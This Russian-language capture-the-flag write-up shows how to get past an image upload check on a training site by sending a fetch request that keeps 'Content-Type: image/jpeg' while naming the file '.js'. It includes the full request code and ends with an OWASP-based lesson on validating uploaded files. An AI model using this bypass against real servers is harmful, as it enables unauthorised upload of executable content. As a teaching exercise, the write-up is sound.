# Загрузка скрипта под видом изображения

На странице `http://<IP>/?page=upload` (кнопка **Add image**) можно загрузить скрипт под видом изображения.
Как это сделать?

## 1. Анализ допустимого формата

Пробуем загрузить изображения разных форматов. Выясняем, что принимается формат JPEG. Смотрим, как выглядит успешный запрос:

```bash
fetch("http://<IP>/?page=upload", {
  "headers": {
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryJvC1a8Zej7QK5Ogp",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://<IP>/?page=upload",
  "body": "------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

## 2. Разбор тела запроса

- `headers["content-type"]` указывает серверу, в каком формате закодировано тело запроса. `multipart/form-data` — это значение для формы с разными типами данных и файлами. Такой тип контента разделяет данные на разные части с помощью уникальной строки `boundary`. Каждая такая часть имеет свои заголовки, в том числе собственный `Content-Type`. Разные браузеры генерируют разные типы таких разделительных строк.
- `headers["upgrade-insecure-requests"]` — заголовок, который указывает серверу, что клиент предпочитает получать ответы по HTTPS.
- `referrer` — указывает, с какой страницы отправляется запрос.
- `"mode": "cors"` — указывает, что включён режим CORS, то есть выполняются междоменные проверки.
- `"credentials": "omit"` — означает, что учётные данные не отправляются вместе с этим запросом.
- `body` — строка с разделителями; нас интересует часть с файлом. Мы имеем:
  - `name="uploaded"` — имя поля input;
  - `filename="<filename>.jpg"` — имя файла;
  - `Content-Type: image/jpeg` — тип контента.

## 3. Работа с HTTP-заголовком Content-Type

Проверяем, есть ли разные значения заголовка для изображений. Действительно, есть:

- `image/jpeg`
- `image/png` → <https://wiki.midrangedynamics.com/manuals/MDRest4i/manual/content-types/>

Когда изображение загружается в браузере через кнопку, браузер сам определяет значение этого заголовка, поэтому скрипт напрямую загрузить нельзя — в этом случае `Content-Type` будет определён как `application/javascript` или `text/javascript`.

Пробуем отправить такой же запрос через консоль, сохраняем `Content-Type: image/jpeg`, но меняем тип файла на `.js`.

```bash
const res = await fetch("http://<IP>/?page=upload", {
  "headers": {
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarygsnTcSeS3o1TbyAG",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://<IP>/?page=upload",
  "body": "------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.js\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});

console.log(await res.text())
```

В ответе получается HTML-страница с флагом.

Эта уязвимость говорит нам о том, что не следует доверять заголовку `Content-Type`, а нужно проводить проверку самого файла, может быть на клиенте, может быть на сервере, в зависимости от архитекуты веб приложения:
- https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

## Примечания к JavaScript

- Метод `fetch` асинхронный: он возвращает не сам ответ от сервера, а объект `Promise`. Чтобы дождаться ответа, используется `await`.
- С `await` возвращается специальный объект `Response`, у которого есть методы `text()` и `json()`. Они также являются асинхронными, то есть тоже требуют использования `await`.
- `console.log` — это способ вывода данных в консоль.

